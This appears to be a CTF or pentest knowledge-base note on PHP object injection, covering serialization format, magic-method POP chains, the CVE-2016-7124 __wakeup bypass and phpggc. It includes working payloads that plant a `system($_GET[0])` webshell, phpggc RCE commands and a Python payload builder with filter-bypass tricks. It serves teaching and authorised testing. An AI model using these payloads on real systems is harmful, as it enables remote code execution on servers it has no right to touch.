---
title: "PHP Object Injection - Magic Methods, POP Chains and phpggc"
category: web
subcategory: php
type: technique
tags: [php, unserialize, deserialization, object-injection, pop-chain, magic-methods, __destruct, __wakeup, __tostring, __call, __get, __invoke, phpggc, monolog, laravel, symfony, guzzle, session-handler, cve-2016-7124, burp]
difficulty: medium
summary: "unserialize() on user data instantiates arbitrary classes; chain __destruct/__wakeup/__toString through loaded code (a POP chain) to reach a dangerous sink."
when_to_use:
  - "unserialize($_GET/$_POST/$_COOKIE/base64_decode(...)) anywhere in the source"
  - "A cookie or parameter that base64-decodes to O:4:\"User\":2:{...} or a:2:{...}"
  - "You have LFI/source disclosure and can enumerate the autoloaded classes"
  - "The app ships a known library (Monolog, Guzzle, Laravel, Symfony, Doctrine) -> phpggc"
tools: [phpggc, php, burp, gopherus]
related: [deser-php-phar, php-type-juggling, php-disable-functions-bypass, deser-java-ysoserial]
---

## TL;DR

`unserialize()` rebuilds objects of *any* class the autoloader can find, with *any* property
values. You do not get to call methods -- but PHP calls magic methods for you at defined moments
(`__wakeup` on load, `__destruct` at teardown, `__toString` on string coercion). A POP chain is a
path from one of those automatic entry points to a sink like `call_user_func`, `system`,
`file_put_contents` or `eval`. If a known library is loaded, `phpggc` has already written the chain.

## Recognise it

- Source: `unserialize($_COOKIE['x'])`, `unserialize(base64_decode($_POST['d']))`,
  `unserialize($data, ['allowed_classes' => true])`, `yaml_parse` with objects enabled.
- Traffic: a parameter that decodes to text starting with `O:`, `a:`, `s:`, `C:` or `E:`.
- `__destruct`, `__wakeup`, `__toString`, `__call`, `__get` defined in the challenge source --
  the author put them there for a reason.
- A `Logger`, `Cache`, `Template`, `FileWriter`, `Connection` class with a file path property.
- `session.serialize_handler` mismatches (see Variants).

## Theory

### Format

```
N;                       null
b:1;                     bool
i:42;                    int
d:3.14;                  float
s:3:"abc";               string (byte length)
S:3:"61\62\63";          string with hex escapes (parser accepts it, filters often miss it)
a:2:{i:0;s:1:"a";i:1;i:2;}          array
O:4:"User":2:{s:4:"name";s:3:"bob";s:2:"id";i:1;}   object
C:4:"Name":len:{...}     object using Serializable::unserialize()
E:8:"Suit:One";          enum (PHP 8.1+)
r:2;                     reference to the 2nd value (by value)
R:2;                     reference to the 2nd value (by reference)
O:+4:"User":...          the '+' is accepted by the parser -- classic filter bypass
```

**Property-name mangling** is the detail that breaks hand-written payloads:

| Visibility | Serialized key | Bytes |
| --- | --- | --- |
| public `$p` | `p` | `p` |
| protected `$p` | `\0*\0p` | NUL `*` NUL `p`, length counts the NULs |
| private `$p` in class `C` | `\0C\0p` | NUL `C` NUL `p` |

So `protected $cmd` in class `A` serializes as `s:6:"\0*\0cmd"` -- length 6, not 3. Get this
wrong and the property silently stays at its default.

### Magic methods, in the order they can fire

| Method | Trigger | Why it matters |
| --- | --- | --- |
| `__wakeup()` | immediately after unserialize | entry point, runs on every object |
| `__unserialize(array)` | PHP 7.4+, replaces `__wakeup` when present | entry point |
| `__destruct()` | when the object is garbage collected (end of request, or immediately if unreferenced) | the most common entry point |
| `__toString()` | object used in string context: `echo`, `.`, `strlen`, `sprintf`, comparison with a string, array key cast | the workhorse pivot |
| `__call($n,$a)` / `__callStatic` | calling an undefined method | pivot when a chain calls `$this->x->foo()` |
| `__get($n)` / `__set` | reading/writing an inaccessible property | pivot on `$this->obj->prop` |
| `__isset` / `__unset` | `isset()`/`empty()`/`unset()` on an inaccessible property | rarely used, often unguarded |
| `__invoke()` | object called as a function: `$obj()` | pivot when a chain does `$callback(...)` |
| `__serialize()` | on dump only | not an attack surface |
| `offsetGet`/`offsetSet` (ArrayAccess) | `$obj['k']` | not magic but behaves like it |

### Building a chain by hand

1. List every class the autoloader can reach (`get_declared_classes()`, or read `composer.json`
   / `vendor/composer/autoload_classmap.php` via LFI).
2. Grep for entry points: `__destruct`, `__wakeup`, `__unserialize`, `__toString`.
3. Grep for sinks: `system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`, `eval`,
   `assert`, `preg_replace` with `/e`, `call_user_func`, `call_user_func_array`, `array_map`,
   `usort`, `file_put_contents`, `fwrite`, `unlink`, `include`, `require`, `extract`,
   `create_function`, `mail` with a 5th arg, `curl_setopt`, `Closure::fromCallable`.
4. Walk backwards from the sink: which property must hold the command? Which method calls it?
   Who calls that method? Repeat until you land on an entry point.
5. Write a PHP file that builds the object graph and `echo serialize($obj);` -- never hand-type
   the payload if you have a PHP binary.

Typical minimal chain:

```php
class Logger {                      // sink
    public $file;  public $data;
    function __destruct(){ file_put_contents($this->file, $this->data); }
}
// payload: O:6:"Logger":2:{s:4:"file";s:14:"/var/www/s.php";s:4:"data";s:22:"<?php system($_GET[0]);";}
```

Two-hop chain (the shape phpggc emits):

```php
class A { public $obj; function __destruct(){ echo $this->obj; } }   // -> __toString
class B { public $cb; public $arg; function __toString(){ return call_user_func($this->cb,$this->arg); } }
// A{obj: B{cb:"system", arg:"id"}}
```

### `__wakeup` bypass (CVE-2016-7124)

In PHP < 5.6.25 / < 7.0.10, declaring a property count **larger than the number of properties
actually present** makes the parser abort the property loop and skip `__wakeup()` entirely,
while still returning the object -- so `__destruct` still fires. Change `O:4:"User":2:{...}`
to `O:4:"User":3:{...}` with only 2 properties.

### Reference tricks

`R:n;` makes a property an alias of the n-th previously-parsed value. Use it when a check does
`if ($this->a !== $this->b)` -- make them the same reference so any later mutation keeps them
equal. `r:n;` is a value copy of the n-th object.

### Other injection points

- **`session.serialize_handler` mismatch.** PHP can write sessions with `php` (`key|serialized`)
  and read with `php_serialize` (`a:1:{s:3:"key";...}`) or vice versa. If any user-controlled
  value lands in the session and the two handlers disagree, a `|` in your data starts a new
  "key" whose value is unserialized. Classic: register with the username
  `|O:6:"Logger":2:{...}`.
- **`phar://`** -- see `deser-php-phar`.
- **`yaml_parse()`** with `!php/object`.
- **Laravel `decrypt()`/cookie** -- APP_KEY leak gives signed, encrypted, then unserialized data.
- **`unserialize($x, ['allowed_classes'=>['Foo']])`** still lets you build `Foo` and reach its
  `__destruct`; the allowlist is not a fix, just a narrowing.

### phpggc gadget families

| Chain prefix | Needs | Effect |
| --- | --- | --- |
| `Monolog/RCE1` .. `RCE9` | monolog/monolog | `call_user_func`-style RCE, different versions |
| `Laravel/RCE1` .. `RCE*` | laravel framework (version-specific) | RCE |
| `Symfony/RCE1` .. `RCE*` | symfony components | RCE |
| `Guzzle/RCE1`, `Guzzle/FW1` | guzzlehttp/guzzle | RCE / file write |
| `ZendFramework/RCE1..4` | zendframework | RCE |
| `Doctrine/RCE1`, `Doctrine/FW1` | doctrine | RCE / file write |
| `SwiftMailer/FW1..3` | swiftmailer | arbitrary file write |
| `Phalcon/RCE1` | phalcon | RCE |
| `SlimPHP/RCE1` | slim | RCE |
| `Yii/RCE1..2` | yiisoft | RCE |
| `CodeIgniter4/RCE1..*` | codeigniter4 | RCE |
| `WordPress/RCE1`, `WordPress/Dompdf/*` | wordpress + plugin | RCE |
| `Magento/*`, `Drupal7/*`, `TYPO3/*` | the CMS | RCE / file write |
| `*/FD*` | various | file **delete** |
| `*/FR*` | various | file **read** |
| `*/SQLI*` | various | SQL injection |

Suffix conventions: `RCE` remote code execution, `FW` file write, `FR` file read, `FD` file
delete, `INFO` info leak, `SQLI` SQL injection. Always check `phpggc -l` on the actual version.

```sh
# list every chain
phpggc -l
# list only Monolog chains and show what each requires
phpggc -l monolog
phpggc -i Monolog/RCE1
# generate, base64 it, url-encode it
phpggc -b Monolog/RCE1 system 'id'
phpggc -u Monolog/RCE1 system 'id'
# file write chain: local source -> remote destination
phpggc -b Guzzle/FW1 /tmp/shell.php ./shell.php
# add the __wakeup skip and the '+' trick
phpggc -w -b Monolog/RCE1 system id
# wrap the result in a phar
phpggc -p phar -o evil.phar Monolog/RCE1 system id
# fast-destruct: force __destruct to run before the rest of the script
phpggc -f -b Monolog/RCE1 system id
```

`-f` (fast-destruct) wraps the payload in an array whose second element is invalid, so PHP
destroys the object immediately instead of at script end -- essential when the script dies or
exits before teardown.

## Attack

1. Decode the blob; confirm it is PHP serialized data (`O:`/`a:` prefix, trailing `}`).
2. Enumerate classes: LFI `vendor/composer/autoload_classmap.php`, `composer.lock`, error
   messages, `phpinfo()`, or a deliberate `O:1:"Z":0:{}` to trigger
   `Class "Z" not found` vs a silent success (class-existence oracle).
3. If a known library is present, go straight to `phpggc`.
4. Otherwise build the chain by hand from the source.
5. Encode exactly as the app expects (raw, base64, urlencode, `S:` hex escapes to dodge WAFs).
6. If `__wakeup` blocks you, bump the property count (old PHP) or use a class without one.
7. If teardown never happens, use `-f`/fast-destruct or find a `__toString` entry.

## Code

```python
#!/usr/bin/env python3
"""PHP serialization payload builder.

Serializes Python values into PHP's format, including private/protected
property mangling, the __wakeup-skip property-count trick, and the 'S:' hex
string form. Self-tests against known-good PHP output strings.
"""
from __future__ import annotations

import base64
import sys
import urllib.parse
from dataclasses import dataclass, field


@dataclass
class PHPObject:
    """A PHP object to serialize.

    props: {name: value}. Prefix a name with '*' for protected, or with
    'ClassName:' for a private property of that class (the mangling is done
    for you).
    """
    cls: str
    props: dict = field(default_factory=dict)
    count_override: int | None = None      # CVE-2016-7124 __wakeup skip
    plus_prefix: bool = False              # O:+4:"User" filter bypass


def _mangle(name: str) -> str:
    if name.startswith("*"):                       # protected
        return "\0*\0" + name[1:]
    if ":" in name and not name.startswith("\0"):  # private "Class:prop"
        cls, _, prop = name.partition(":")
        return "\0%s\0%s" % (cls, prop)
    return name


def php_serialize(value) -> str:
    """Serialize a Python value into PHP serialize() format."""
    if value is None:
        return "N;"
    if isinstance(value, bool):
        return "b:%d;" % int(value)
    if isinstance(value, int):
        return "i:%d;" % value
    if isinstance(value, float):
        return "d:%s;" % repr(value)
    if isinstance(value, str):
        raw = value.encode("utf-8", "surrogateescape")
        return 's:%d:"%s";' % (len(raw), value)
    if isinstance(value, (list, tuple)):
        body = "".join(php_serialize(i) + php_serialize(v)
                       for i, v in enumerate(value))
        return "a:%d:{%s}" % (len(value), body)
    if isinstance(value, dict):
        body = "".join(php_serialize(k) + php_serialize(v)
                       for k, v in value.items())
        return "a:%d:{%s}" % (len(value), body)
    if isinstance(value, PHPObject):
        body = "".join(php_serialize(_mangle(k)) + php_serialize(v)
                       for k, v in value.props.items())
        n = value.count_override if value.count_override is not None \
            else len(value.props)
        name = ("+" if value.plus_prefix else "") + str(len(value.cls))
        return 'O:%s:"%s":%d:{%s}' % (name, value.cls, n, body)
    raise TypeError("cannot serialize %r" % type(value))


def hex_string(s: str) -> str:
    """The 'S:' form: every byte as \\xx. Defeats naive string blacklists."""
    raw = s.encode()
    esc = "".join("\\%02x" % b for b in raw)
    return 'S:%d:"%s";' % (len(raw), esc)


def fast_destruct(payload: str) -> str:
    """Wrap in a 1-element array declared as 2 so PHP aborts parsing early.

    The object is already built, so its __destruct fires immediately instead
    of at request teardown.
    """
    return "a:2:{i:0;%si:1;i:1;}" % payload


def session_upload(key: str, payload: str) -> str:
    """php|php_serialize handler-mismatch injection value."""
    return "|" + payload


def encode(payload: str, how: str = "raw") -> str:
    if how == "raw":
        return payload
    if how == "b64":
        return base64.b64encode(payload.encode("utf-8", "surrogateescape")).decode()
    if how == "url":
        return urllib.parse.quote(payload, safe="")
    if how == "b64url":
        return urllib.parse.quote(
            base64.b64encode(payload.encode("utf-8", "surrogateescape")).decode(),
            safe="")
    raise ValueError(how)


# --- ready-made chains -----------------------------------------------------

def logger_file_write(cls: str, file_prop: str, data_prop: str,
                      path: str, content: str) -> str:
    """Single-hop: __destruct -> file_put_contents($this->file,$this->data)."""
    return php_serialize(PHPObject(cls, {file_prop: path, data_prop: content}))


def two_hop_callback(outer: str, outer_prop: str,
                     inner: str, cb_prop: str, arg_prop: str,
                     func: str = "system", arg: str = "id") -> str:
    """__destruct -> echo $this->obj -> __toString -> call_user_func()."""
    inner_obj = PHPObject(inner, {cb_prop: func, arg_prop: arg})
    return php_serialize(PHPObject(outer, {outer_prop: inner_obj}))


def _self_test() -> None:
    # scalars, verified against PHP's own output format
    assert php_serialize(None) == "N;"
    assert php_serialize(True) == "b:1;"
    assert php_serialize(False) == "b:0;"
    assert php_serialize(42) == "i:42;"
    assert php_serialize("abc") == 's:3:"abc";'
    assert php_serialize("") == 's:0:"";'
    # byte length, not character length
    assert php_serialize("é") == 's:2:"é";'
    # arrays
    assert php_serialize([1, 2]) == "a:2:{i:0;i:1;i:1;i:2;}"
    assert php_serialize({"a": 1}) == 'a:1:{s:1:"a";i:1;}'
    assert php_serialize([]) == "a:0:{}"
    # objects, public props
    o = PHPObject("User", {"name": "bob", "id": 1})
    assert php_serialize(o) == 'O:4:"User":2:{s:4:"name";s:3:"bob";s:2:"id";i:1;}'
    # protected: \0*\0name, length 7 for "\0*\0cmd" -> 3 NUL-padded + 3 chars
    prot = php_serialize(PHPObject("A", {"*cmd": "id"}))
    assert prot == 'O:1:"A":1:{s:6:"\x00*\x00cmd";s:2:"id";}', repr(prot)
    # private: \0Class\0name
    priv = php_serialize(PHPObject("A", {"A:cmd": "id"}))
    assert priv == 'O:1:"A":1:{s:6:"\x00A\x00cmd";s:2:"id";}', repr(priv)
    # __wakeup skip: declared count > actual
    wk = php_serialize(PHPObject("A", {"x": 1}, count_override=2))
    assert wk == 'O:1:"A":2:{s:1:"x";i:1;}', wk
    # '+' length prefix
    plus = php_serialize(PHPObject("A", {"x": 1}, plus_prefix=True))
    assert plus.startswith('O:+1:"A"'), plus
    # nested objects
    nested = two_hop_callback("A", "obj", "B", "cb", "arg")
    assert nested == ('O:1:"A":1:{s:3:"obj";O:1:"B":2:'
                      '{s:2:"cb";s:6:"system";s:3:"arg";s:2:"id";}}'), nested
    # file-write chain
    fw = logger_file_write("Logger", "file", "data",
                           "/var/www/s.php", "<?php system($_GET[0]);")
    assert '"Logger"' in fw and "/var/www/s.php" in fw
    # hex string form
    assert hex_string("ab") == 'S:2:"\\61\\62";'
    # fast destruct wrapper
    assert fast_destruct("X").startswith("a:2:{i:0;X")
    # session mismatch
    assert session_upload("u", "O:1:\"A\":0:{}").startswith("|O:")
    # encodings round-trip
    p = php_serialize(o)
    assert base64.b64decode(encode(p, "b64")).decode() == p
    assert urllib.parse.unquote(encode(p, "url")) == p
    print("[ok] 18 serialization cases verified")


if __name__ == "__main__":
    if len(sys.argv) >= 4:
        print(encode(logger_file_write("Logger", "file", "data",
                                       sys.argv[2], sys.argv[3]), sys.argv[1]))
    else:
        _self_test()
```

Companion PHP generator (always prefer this when a `php` binary is available):

```php
<?php
// build.php - run: php build.php | tee payload.txt
class Logger { public $file = '/var/www/html/s.php';
               public $data = '<?php system($_GET[0]); ?>'; }
echo base64_encode(serialize(new Logger())), "\n";
// class-existence oracle helper
echo serialize(array_slice(get_declared_classes(), -20)), "\n";
```

## Variants & pitfalls

- **Property count must match** unless you are deliberately doing the `__wakeup` skip; a
  mismatch on modern PHP makes `unserialize()` return `false` with a notice.
- **String lengths are byte lengths.** UTF-8, emoji and NUL bytes all break naive payloads.
- **NUL bytes die in `$_GET`** unless URL-encoded as `%00`. Many CTF harnesses strip them --
  use the `S:` hex form, which encodes NUL as `\00` in printable ASCII.
- **`__destruct` may never fire** if the script `exit()`s inside a handler or the object stays
  referenced. Use fast-destruct, or pick a `__toString`/`__wakeup` entry.
- **PHP 8 removes `create_function`** and `preg_replace /e`; `assert()` no longer evaluates
  strings since 8.0. Check the version before picking a sink.
- **`allowed_classes`**: `unserialize($d, ['allowed_classes'=>false])` turns every object into
  `__PHP_Incomplete_Class` -- no magic methods fire, no bug. An *array* allowlist still fires
  `__destruct` for allowed classes.
- **Serializable vs `__unserialize`**: a class implementing `Serializable` uses the `C:` form,
  and its `unserialize()` method runs *with full control over the payload body* -- often an
  easier entry than `__wakeup`.
- **Enums (`E:`)** cannot hold state; not useful as a gadget, but they can satisfy a type check.
- **Nested `phpggc` chains**: `-p phar` wraps a chain into a phar, `-b`/`-u`/`-j` change the
  encoding, `-a` includes an "ascii-safe" transformation.
- **Length-prefix sanity**: if the app applies `addslashes`/`htmlspecialchars` *after* you
  control the string, an injected quote shifts the byte count -- this is the classic
  "PHP object injection via a length-changing filter" bug (e.g. `str_replace` widening a
  character after serialization).
- **Serialization escape via a widening filter**: if `serialize()` output passes through
  `str_replace('x','yy',$s)` the lengths desynchronise and you can smuggle a whole extra
  property. This is how "PHP object injection without unserialize on user input" challenges work.

## Tools

- `phpggc` -- the gadget-chain generator (`-l`, `-i`, `-b`, `-u`, `-f`, `-w`, `-p phar`).
- `php -a` / `php -r 'echo serialize(...);'` -- build and verify payloads locally.
- `php --rf unserialize`, `php -i | grep serialize_handler`.
- Burp Decoder for the base64/url layers; `PHP Object Injection Check` extensions.
- `gopherus` -- when the sink is an internal FastCGI/Redis/MySQL service.

## References

- PHP manual -- Object Serialization, magic methods, `unserialize()` notes.
- ambionics/phpggc -- gadget chain catalogue and README.
- Stefan Esser -- "Shocking News in PHP Exploitation" / "Utilizing Code Reuse in PHP Application Exploits" (the origin of POP chains).
- OWASP -- PHP Object Injection.
